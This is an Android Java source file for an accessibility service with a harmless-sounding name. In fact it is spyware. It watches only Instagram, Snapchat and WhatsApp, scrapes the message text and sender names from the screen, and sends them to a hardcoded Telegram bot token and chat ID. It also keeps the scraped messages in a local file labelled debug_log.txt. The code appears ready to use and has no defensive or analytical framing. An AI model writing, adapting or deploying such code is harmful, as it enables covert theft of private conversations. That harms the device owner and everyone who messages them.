package com.example.textreader;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;
import java.util.ArrayList;
import java.util.List;

public class GlobalActionBarService extends AccessibilityService {

    private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    // 🔥 REPLACE WITH YOUR REAL TOKEN AND CHAT ID
    private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";
    private static final String CHAT_ID = "5465116744";

    // Cache to avoid sending duplicate messages
    private String lastSentMessage = "";

    // Blacklist of UI junk words (even if they appear inside a message, we filter them)
    private Set<String> uiJunk = new HashSet<String>() {{
        add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
        add("Delete"); add("Copy"); add("Reply"); add("Forward"); add("Settings");
        add("Search"); add("Type a message"); add("New message"); add("Seen");
        add("Delivered"); add("Read"); add("Like"); add("Comment"); add("Share");
        add("Save"); add("Cancel"); add("Done"); add("Edit"); add("Post");
        add("Story"); add("Home"); add("Explore"); add("Activity");
        add("Notifications"); add("Direct"); add("Inbox"); add("Create");
        add("View"); add("Reply"); add("Forward"); add("Delete"); add("More");
        add("Options"); add("Menu"); add("Add"); add("Remove"); add("Block");
        add("Report"); add("Unfollow"); add("Follow"); add("Mute"); add("Hide");
        add("Active now"); add("Typing..."); add("Today"); add("Yesterday");
        add("Seen by"); add("Delivered to"); add("Read by");
    }};

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        sendToTelegram("✅ Screen Logger service started successfully!");
        writeToFile("Service started at " + dateFormat.format(new Date()));
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();

        // Target only Instagram, Snapchat, WhatsApp
        if (!pkg.equals("com.instagram.android") &&
            !pkg.equals("com.snapchat.android") &&
            !pkg.equals("com.whatsapp")) {
            return;
        }

        // Only scrape when screen content changes (new message or scroll)
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                // Extract all text with context (we'll try to keep structure)
                List<MessageEntry> entries = extractMessages(root);
                if (!entries.isEmpty()) {
                    // Build a single log entry with all messages
                    StringBuilder logBuilder = new StringBuilder();
                    logBuilder.append(String.format("[%s] APP: %s\n", dateFormat.format(new Date()), getAppName(pkg)));
                    for (MessageEntry entry : entries) {
                        logBuilder.append("  📩 ").append(entry.sender).append(": ").append(entry.message).append("\n");
                    }
                    String fullLog = logBuilder.toString().trim();
                    // Only send if different from last
                    if (!fullLog.equals(lastSentMessage)) {
                        lastSentMessage = fullLog;
                        sendToTelegram(fullLog);
                        writeToFile(fullLog);
                    }
                }
            }
        }
    }

    /**
     * Represents a single message entry with sender and text
     */
    private static class MessageEntry {
        String sender;
        String message;
        MessageEntry(String sender, String message) {
            this.sender = sender;
            this.message = message;
        }
    }

    private List<MessageEntry> extractMessages(AccessibilityNodeInfo root) {
        // First, collect all text nodes with their parent hierarchy
        List<String> allTexts = new ArrayList<>();
        collectAllTexts(root, allTexts);

        // Now we have a list of strings, but they are not grouped by message.
        // We'll try to group by looking at the structure: messages often appear as a list of items,
        // each containing a name and a message. However, the accessibility tree doesn't preserve grouping.
        // We can use a heuristic: messages are usually longer than UI labels, and they don't contain UI junk.
        // Also, we can try to detect names by looking for short text before a message (in the same parent).
        // To simplify, we'll just filter and format as a list of messages.

        List<MessageEntry> entries = new ArrayList<>();
        String currentSender = "Unknown";
        // Simple heuristic: iterate through all texts, and if we find a text that looks like a name
        // (short, no spaces, maybe ends with colon?), we set it as current sender.
        // But in reality, names are not always present in the accessibility tree as separate nodes.

        // For now, we'll just take all texts that pass the filter and assume they are messages.
        // We'll also try to detect if a text is likely a sender name (short, common names) – but that's error-prone.

        // Let's just collect all unique texts that are likely messages and send them as a list.
        // We'll filter out junk and duplicates.
        Set<String> uniqueMessages = new HashSet<>();
        for (String text : allTexts) {
            text = text.trim();
            if (isLikelyMessage(text) && !uiJunk.contains(text) && !containsJunk(text)) {
                // Try to extract sender: sometimes the text starts with a name and colon.
                // e.g., "John: Hey!" – we can split by colon.
                if (text.contains(":")) {
                    String[] parts = text.split(":", 2);
                    if (parts.length == 2) {
                        String possibleName = parts[0].trim();
                        String possibleMsg = parts[1].trim();
                        if (possibleName.length() < 30 && possibleMsg.length() > 0) {
                            // If the name part is short, treat it as sender
                            if (!uniqueMessages.contains(possibleMsg)) {
                                uniqueMessages.add(possibleMsg);
                                entries.add(new MessageEntry(possibleName, possibleMsg));
                            }
                            continue;
                        }
                    }
                }
                // Otherwise, treat it as a regular message (sender unknown)
                if (!uniqueMessages.contains(text)) {
                    uniqueMessages.add(text);
                    entries.add(new MessageEntry("Unknown", text));
                }
            }
        }
        return entries;
    }

    private void collectAllTexts(AccessibilityNodeInfo node, List<String> list) {
        if (node == null) return;
        if (node.getText() != null) {
            String text = node.getText().toString();
            if (!text.isEmpty()) {
                list.add(text);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collectAllTexts(child, list);
        }
    }

    private boolean isLikelyMessage(String text) {
        // A real message is usually:
        // - Longer than 10 characters (to filter out UI labels)
        // - Does not contain common UI patterns
        // - Does not look like a timestamp
        if (text.length() < 8) return false;
        if (containsJunk(text)) return false;
        if (containsTimestamp(text)) return false;
        // Also, if it's all numbers, it's probably a time or count
        if (text.matches(".*\\d+.*") && text.length() < 15) return false;
        return true;
    }

    private boolean containsJunk(String text) {
        for (String junk : uiJunk) {
            if (text.contains(junk)) return true;
        }
        return false;
    }

    private boolean containsTimestamp(String text) {
        return text.matches(".*\\d{1,2}:\\d{2}.*") ||
               text.matches(".*\\d{1,2}[mh] .*") ||
               text.matches(".*(AM|PM).*") ||
               text.matches(".*\\d+\\s*(sec|min|hour).*");
    }

    private String getAppName(String pkg) {
        if (pkg.equals("com.instagram.android")) return "INSTAGRAM";
        if (pkg.equals("com.snapchat.android")) return "SNAPCHAT";
        if (pkg.equals("com.whatsapp")) return "WHATSAPP";
        return pkg;
    }

    // ---------- Telegram Sender ----------
    private void sendToTelegram(final String message) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                            "/sendMessage?chat_id=" + CHAT_ID +
                            "&text=" + URLEncoder.encode(message, "UTF-8");
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);
                    int responseCode = conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    writeToFile("Telegram error: " + e.toString());
                }
            }
        }).start();
    }

    // ---------- Local Logging ----------
    private void writeToFile(String text) {
        try {
            File logFile = new File(getFilesDir(), "debug_log.txt");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.write(text + "\n");
            writer.flush();
            writer.close();
        } catch (Exception e) {
            // ignore
        }
    }

    @Override
    public void onInterrupt() {}
}
